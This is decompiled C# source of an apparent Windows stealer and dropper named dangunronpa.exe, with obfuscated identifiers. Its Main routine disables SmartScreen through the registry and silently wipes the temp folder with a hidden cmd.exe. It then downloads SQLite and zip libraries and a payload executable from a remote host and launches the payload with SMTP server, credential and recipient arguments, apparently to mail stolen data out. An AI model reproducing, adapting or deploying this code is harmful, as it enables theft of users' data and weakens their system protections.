// Decompiled with JetBrains decompiler
// Type: samsung.doma
// Assembly: dangunronpa, Version=1.2.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 3958FDFD-FC81-45EF-BFDA-37B7EDF3E7D7
// Assembly location: C:\Users\лёха\Desktop\dangunronpa.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;

namespace samsung
{
  internal static class doma
  {
    private static ProcessStartInfo xyz()
    {
      return new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C rd /s /q %temp% ",
        WindowStyle = ProcessWindowStyle.Hidden
      };
    }

    private static bool ss4545454()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", true);
      try
      {
        if (registryKey.GetValue("SmartScreenEnabled") != null)
          registryKey.SetValue("SmartScreenEnabled", (object) "Off");
        registryKey.Close();
        registryKey.Dispose();
        return true;
      }
      catch
      {
        return false;
      }
    }

    private static void Main()
    {
      doma.ss4545454();
      if (Process.GetProcessesByName("wsnm").Length > 0)
        return;
      string environmentVariable = Environment.GetEnvironmentVariable("temp");
      new Process()
      {
        StartInfo = doma.xyz()
      }.Start();
      string str1 = environmentVariable + "\\" + Environment.UserName + ".html";
      string str2 = vgf.cbxfgfbgwes() + ".exe";
      string str3 = vgf.cbxfgfbgwes();
      string str4 = string.Concat(new object[4]
      {
        (object) environmentVariable,
        (object) '\\',
        (object) str3,
        (object) '\\'
      });
      vgf.tre(afa.mail_otpr35215252);
      vgf.tre(afa.mail_pass3525564235);
      string str5 = vgf.tre(afa.mail_polu353653543);
      vgf.tre(afa.mail_otpr35215252);
      string str6 = vgf.tre(AMV.DontKillMe(vgf.tre(afa.ssilka526525724))).Replace(':', ';');
      string str7 = str6;
      char[] chArray = new char[1]
      {
        ';'
      };
      string str8;
      string str9 = str8 = str7.Split(chArray)[0];
      string str10 = str6.Split(';')[1];
      string str11 = vgf.tre(afa.mail_ru_ru_serv35264235);
      string[] strArray1 = new string[3]
      {
        str4,
        str4 + "x64\\",
        str4 + "x86\\"
      };
      foreach (string DNG in strArray1)
        vgf.fefqeefqf(DNG);
      string[] strArray2 = new string[4]
      {
        "x86/SQLite.Interop.dll",
        "x64/SQLite.Interop.dll",
        "System.Data.SQLite.dll",
        "Ionic.Zip.dll"
      };
      foreach (string str12 in strArray2)
        vgf.gwredngr(str4 + str12, vgf.qrqwer() + "com/" + str12);
      vgf.gwredngr(str4 + str2, vgf.qrqwer() + "com/zip");
      string arguments = str11 + (object) ' ' + (string) (object) afa.mail_ru_ru_port6423464624 + (string) (object) ' ' + str9 + (string) (object) ' ' + str10 + (string) (object) ' ' + str8 + (string) (object) ' ' + str5 + (string) (object) ' ' + afa.subject + (string) (object) ' ' + afa.budi;
      Process.Start(str4 + str2, arguments);
    }
  }
}
